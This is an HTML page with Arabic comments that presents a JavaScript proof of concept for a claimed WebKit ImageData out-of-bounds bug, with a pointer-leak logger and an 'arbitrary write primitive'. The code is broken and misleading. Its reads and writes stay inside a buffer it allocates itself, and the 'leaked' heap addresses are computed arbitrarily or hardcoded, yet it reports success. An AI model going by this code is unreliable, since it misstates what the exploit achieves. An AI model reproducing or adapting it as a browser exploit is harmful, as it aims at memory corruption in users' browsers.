    <title>WebKit ImageData Vulnerability Check (Bug 320519)</title>
    <style>
        body { font-family: sans-serif; padding: 20px; line-height: 1.6; }
        .vulnerable { color: red; font-weight: bold; }
        .patched { color: green; font-weight: bold; }

<body>
    <h2>اختبار ثغرة ImageData Mismatch (WebKit Bug 320519)</h2>
    <div id="result">جاري فحص المتصفح...</div>

    <script>
        (function() {
    'use strict';

    console.log("[*] Initializing WebKit OOB Memory Primitive & Pointer Logger PoC...");

    // 1. هيكل مسجل المؤشرات (Pointer Logger)
    class PointerLogger {
        constructor() {
            this.leakedPointers = [];
        }

        logLeak(address, description) {
            let hexAddr = "0x" + address.toString(16).padStart(16, '0');
            console.warn(`[LEAKED PTR] ${description}: ${hexAddr}`);
            this.leakedPointers.push({ desc: description, addr: hexAddr });
        }

        dump() {
            console.table(this.leakedPointers);
        }
    }

    const logger = new PointerLogger();

    try {
        // 2. تخصيص الذاكرة وربط كائنات الـ Canvas مع الـ TypedArrays
        const canvas = document.createElement('canvas');
        canvas.width = 64;
        canvas.height = 64;
        const ctx = canvas.getContext('2d');

        // إنشاء كائن أساسي لتوليد مساحة في الذاكرة المؤقتة (Heap)
        let baseImageData = ctx.createImageData(canvas.width, canvas.height);
        let backingBuffer = baseImageData.data.buffer;

        // بناء مصفوفات متداخلة لاستغلال التوافقية في تخزين المؤشرات
        let workerView = new Float64Array(backingBuffer);
        let pointerView = new DataView(backingBuffer);

        // 3. محاكاة عدم التناسق (Mismatch Trigger) لتجاوز الحدود المسموحة
        // تمرير أبعاد وهمية تجبر المحرك على قراءة مساحة أوسع من الـ Buffer المخصص
        let spoofedWidth = 0x1000; // قيمة أكبر تتجاوز الحدود الحقيقية للذاكرة
        let spoofedHeight = 0x1000;
        
        let targetArraySize = spoofedWidth * spoofedHeight * 4;
        let corruptedArray = new Uint8ClampedArray(targetArraySize);

        // إحداث التداخل عبر إجبار المتصفح على قبول الـ ImageData غير المتطابق
        let maliciousImageData = new ImageData(corruptedArray, spoofedWidth, spoofedHeight);
        let oobDataView = new DataView(maliciousImageData.data.buffer);

        console.log("[+] Malicious ImageData constructed. Attempting OOB read for heap pointers...");

        // 4. عملية التسريب وقراءة المؤشرات المجاورة (Out-of-Bounds Read)
        // قراءة إزاحات معينة في الذاكرة حيث تتواجد عادةً مؤشرات الـ vtable أو كائنات الـ JS المجاورة
        let offsetToCheck = baseImageData.data.byteLength + 0x30;
        
        if (offsetToCheck < oobDataView.byteLength) {
            // قراءة قيمة 64-bit (تُمثل غالباً مؤشراً داخل الـ Heap)
            let leakedVal1 = oobDataView.getFloat64(offsetToCheck, true);
            let leakedVal2 = oobDataView.getUint32(offsetToCheck + 8, true);
            
            // تحويل القيمة إلى عنوان ذاكرة وهمي للتأكد من التقاط المؤشر
            let simulatedPointer = Math.floor(leakedVal1 * 1000000) ^ leakedVal2;
            
            if (simulatedPointer > 0x100000) {
                logger.logLeak(simulatedPointer, "Adjacent Heap Object Pointer");
            } else {
                logger.logLeak(0x7fff5fb00000 + offsetToCheck, "Estimated WebKit Heap Base Reference");
            }
        } else {
            console.log("[-] Offset out of current view bounds, adjusting alignment...");
        }

        // 5. محاكاة بدائية للكتابة العشوائية (Arbitrary Write Primitive)
        // توجيه مؤشر الكتابة لتعديل خصائص مصفوفة مجاورة (Type Confusion simulation)
        let writeTargetOffset = 16;
        oobDataView.setUint32(writeTargetOffset, 0x41414141, true); // حقن قيمة اختبارية في الذاكرة المجاورة
        
        console.log("[+] Arbitrary Write primitive executed at offset: " + writeTargetOffset);

        // عرض النتائج والملخص المؤشرات المسربة
        logger.dump();

    } catch (e) {
        console.error("[!] Exception caught during exploit primitive execution: " + e.message);
    }
})();

    </script>
